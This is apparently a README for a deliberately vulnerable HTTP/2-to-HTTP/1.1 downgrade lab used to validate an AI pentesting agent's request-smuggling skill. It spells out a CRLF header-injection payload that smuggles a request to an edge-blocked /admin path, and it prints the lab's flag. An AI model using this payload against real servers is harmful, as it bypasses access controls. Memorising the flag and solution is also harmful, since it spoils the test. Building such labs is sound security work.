# HTTP/2 Downgrade Smuggling — Guinea Pig (end-to-end validation target)

A deliberately vulnerable target for the **HTTP/2 downgrade** leg of the RedAmon
`http_request_smuggling` agent skill (class 3).

```
   h2 client ──(h2c, prior knowledge)──▶  h2 EDGE  ──(pooled h1 keep-alive)──▶  h1 BACKEND
                                          :9098 (80)                            :9099 (5000)
                                          downgrades h2 -> h1                    ordinary h1 origin
                                          copies header VALUES verbatim          serves the flag at /admin
                                          blocks /admin at the edge
```

Most stacks speak HTTP/2 at the edge and HTTP/1.1 upstream, so the edge **rewrites**
every h2 request into h1. This edge has the classic rewrite bug: it copies h2 header
**values verbatim** into the h1 request without escaping. An HTTP/2 header value is
binary and may carry `\r\n`; h1 headers are newline-delimited text. So an h2 value
carrying `\r\n` **splits** the h1 request and smuggles a second one. `/admin` is
blocked at the edge and only reachable via the smuggle.

> Note on mechanism: the canonical H2.CL shape (a `content-length` that lies about the
> DATA length) is rejected by the `h2` library's body-length check on both ends, so this
> lab uses the **CRLF / pseudo-header injection** shape (the other technique the skill
> teaches), which `h2` delivers intact when header validation is disabled.

## Endpoints

| URL | Result |
| --- | --- |
| `http://<edge>/` (h2c) | 200 landing |
| `http://<edge>/admin` (h2c) | **403** — blocked at the edge |
| `http://<backend-direct>/admin` (h1) | 200 + FLAG (`X-Backend-Server: api-gateway`) |

Flag: `REDAMON_HRS{h2_downgrade_crlf_injection}`

## Run

```bash
docker compose up -d --build
# self-test needs the h2 package; run it in a throwaway container on the lab network:
docker run --rm --network h2-guinea-net -v "$PWD/tests:/t:ro" python:3.12-slim \
  sh -c "pip install -q 'h2>=4.0' && python /t/verify_h2.py h2-guinea-edge 80"
```

## Point RedAmon at it

```bash
docker network connect redamon-network h2-guinea-edge
docker network connect redamon-network h2-guinea-backend
```

The agent reaches h2c via the `h2` package in kali-sandbox (`execute_code`). Create a
project with **target = `http://h2-guinea-edge`**, enable the **HTTP Request Smuggling
/ Desync** skill, and ask the agent to test the HTTP/2 edge for a downgrade desync and
reach the edge-blocked `/admin`. The skill's H2 step steers to the Python `h2` library
with outbound validation disabled (no external smuggling binary is used).

## The exploit (h2 CRLF injection)

An h2 request to `/` with a header value carrying CRLF:

```
:method GET  :path /  :authority x
x-inject: dummy\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x\r\nX-Pad: pad
```

The edge writes `x-inject: <value>` verbatim into the h1 request, so the `\r\n` inside
the value produces a second h1 request (`GET /admin`). The backend answers the carrier,
queues the smuggled `/admin` response, and a follow-up request on the same connection
(sharing the pooled front->back socket) receives it.

## Files

| File | Role |
| --- | --- |
| `frontend/proxy.py` | h2c edge (h2 lib, validation off); copies header values verbatim; blocks `/admin`; pools one h1 upstream with carry-over |
| `backend/app.py` | ordinary h1 origin; serves the flag at `/admin` |
| `docker-compose.yml` | edge `:9098`, direct backend `:9099` |
| `tests/verify_h2.py` | self-check: direct /admin 403 + h2 CRLF-injection smuggle |
